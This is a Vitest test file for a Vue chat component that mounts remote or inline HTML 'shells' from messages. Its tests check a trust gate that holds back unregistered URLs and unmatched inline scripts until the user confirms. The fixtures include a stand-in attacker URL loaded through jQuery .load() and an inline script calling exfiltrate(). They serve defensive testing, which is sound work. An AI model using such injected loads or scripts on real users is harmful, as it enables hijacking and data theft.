import { describe, it, expect, beforeEach } from 'vitest'
import { mount } from '@vue/test-utils'
import { computed } from 'vue'
import { createPinia, setActivePinia } from 'pinia'
import ShellAwareContent from '../../src/components-v2/st/ShellAwareContent.vue'
import { useCampaignStore } from '../../src/stores/campaign.js'

const HOME =
  'https://testingcf.jsdelivr.net/gh/The-poem-of-destiny/FrontEnd-for-destined-journey@1.6.2/dist/home/index.html'

const CardShellHostStub = {
  name: 'CardShellHost',
  props: ['campaignId', 'url', 'html'],
  template: '<article data-shell-host>{{ campaignId }}|{{ url }}</article>',
}

function mountWithLayout(content, layout = {}, props = {}) {
  return mount(ShellAwareContent, {
    props: { content, ...props },
    global: {
      provide: {
        storyforgeCardShellLayout: {
          suppressedMessageShellUrls: computed(() => layout.suppressed || []),
          trustedMessageShellUrls: computed(() => layout.trusted || []),
          inlineShellTriggers: computed(() => layout.inlineTriggers || []),
        },
      },
      stubs: {
        CardShellHost: CardShellHostStub,
        RichContent: true,
      },
    },
  })
}

describe('ShellAwareContent campaign context', () => {
  beforeEach(() => {
    setActivePinia(createPinia())
  })

  it('binds message-local card shells to the active Campaign worldbook', () => {
    const campaign = useCampaignStore()
    campaign.activeCampaign = { id: 'campaign-message-shell', name: '消息壳验收' }

    const wrapper = mountWithLayout(`$('body').load('${HOME}')`, { trusted: [HOME] })

    expect(wrapper.findComponent(CardShellHostStub).props('campaignId')).toBe('campaign-message-shell')
  })

  it('does not duplicate an opening shell inside a message when the page owns its URL', () => {
    const wrapper = mountWithLayout(`$('body').load('${HOME}')`, {
      suppressed: [HOME],
      trusted: [HOME],
    })

    expect(wrapper.findComponent(CardShellHostStub).exists()).toBe(false)
  })

  it('keeps a different opening URL mounted by the message', () => {
    const customOpening =
      'https://testingcf.jsdelivr.net/gh/The-poem-of-destiny/FrontEnd-for-destined-journey@1.6.2/dist/custom_start/index.html'
    const wrapper = mountWithLayout(
      `$('body').load('${HOME}') $('body').load('${customOpening}')`,
      { suppressed: [HOME], trusted: [HOME, customOpening] },
    )

    const shellHosts = wrapper.findAllComponents(CardShellHostStub)
    expect(shellHosts).toHaveLength(1)
    expect(shellHosts[0].props('url')).toBe(customOpening)
  })
})

describe('ShellAwareContent mount trust gate (H3)', () => {
  beforeEach(() => {
    setActivePinia(createPinia())
  })

  const ATTACKER = 'https://files.catbox.moe/attacker.html'

  it('gates unregistered .load urls behind an explicit confirmation', async () => {
    const wrapper = mountWithLayout(`$('body').load('${ATTACKER}')`, { trusted: [HOME] })

    // 未注册 URL：不挂载，出确认卡
    expect(wrapper.findComponent(CardShellHostStub).exists()).toBe(false)
    const confirm = wrapper.find('[data-testid="shell-mount-confirm"]')
    expect(confirm.exists()).toBe(true)
    expect(confirm.text()).toContain(ATTACKER)

    // 用户显式放行 → 挂载
    await wrapper.find('[data-testid="shell-mount-approve"]').trigger('click')
    expect(wrapper.findComponent(CardShellHostStub).props('url')).toBe(ATTACKER)
    expect(wrapper.find('[data-testid="shell-mount-confirm"]').exists()).toBe(false)
  })

  it('mounts inline executable docs when the card regex trigger matches the source (H4)', () => {
    const doc = '<body class="cultivation"><script>boot()</script></body>'
    const wrapper = mountWithLayout(
      `境界提升。\n${doc}`,
      { inlineTriggers: [{ label: '修炼界面', trigger: '【修炼界面】' }] },
      { sourceContent: '【修炼界面】境界：筑基' },
    )

    const host = wrapper.findComponent(CardShellHostStub)
    expect(host.exists()).toBe(true)
    expect(host.props('html')).toContain('boot()')
    expect(wrapper.find('[data-testid="shell-inline-confirm"]').exists()).toBe(false)
  })

  it('gates inline docs behind confirmation when no card trigger matches (H4)', async () => {
    const doc = '<body><script>exfiltrate()</script></body>'
    const wrapper = mountWithLayout(
      `叙事。\n${doc}`,
      { inlineTriggers: [{ label: '修炼界面', trigger: '【修炼界面】' }] },
      { sourceContent: '模型凭空输出的可执行文档' },
    )

    expect(wrapper.findComponent(CardShellHostStub).exists()).toBe(false)
    expect(wrapper.find('[data-testid="shell-inline-confirm"]').exists()).toBe(true)

    await wrapper.find('[data-testid="shell-inline-approve"]').trigger('click')
    expect(wrapper.findComponent(CardShellHostStub).props('html')).toContain('exfiltrate()')
    expect(wrapper.find('[data-testid="shell-inline-confirm"]').exists()).toBe(false)
  })

  it('fails closed when no layout/trust context is provided', () => {
    const wrapper = mount(ShellAwareContent, {
      props: { content: `$('body').load('${HOME}')` },
      global: {
        stubs: {
          CardShellHost: CardShellHostStub,
          RichContent: true,
        },
      },
    })

    expect(wrapper.findComponent(CardShellHostStub).exists()).toBe(false)
    expect(wrapper.find('[data-testid="shell-mount-confirm"]').exists()).toBe(true)
  })
})
